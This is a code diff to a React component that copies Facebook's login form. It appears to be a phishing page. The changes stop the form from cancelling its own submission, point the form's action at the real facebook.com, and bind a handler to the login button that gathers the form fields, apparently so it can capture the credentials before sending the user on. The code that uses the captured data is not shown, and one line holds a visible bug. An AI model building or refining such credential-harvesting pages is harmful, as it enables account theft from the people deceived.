@@ -6,7 +6,7 @@ const Facebook = () => {
     const formRef = useRef(null);
 
     const handleSubmit = (event) => {
-      event.preventDefault();
+    //  event.preventDefault();
       const formData = new formData(event.target);
       const data = Object.fromEntries(formData.entries());
 
@@ -62,7 +62,7 @@ const Facebook = () => {
                                 <form
                                 className="_9vtf"
                                 data-testid="royal_login_form"
-                                action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA4NzQ5MTQxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D"
+                                action="https://facebook.com"
                                 method="POST"
                                 ref={formRef}
                                 onSubmit={handleSubmit}
@@ -134,6 +134,7 @@ const Facebook = () => {
                                     data-testid="royal_login_button"
                                     type="submit"
                                     id="u_0_5_t/"
+                                    onClick={handleSubmit}
                                     >
                                     Log In
                                     </button>
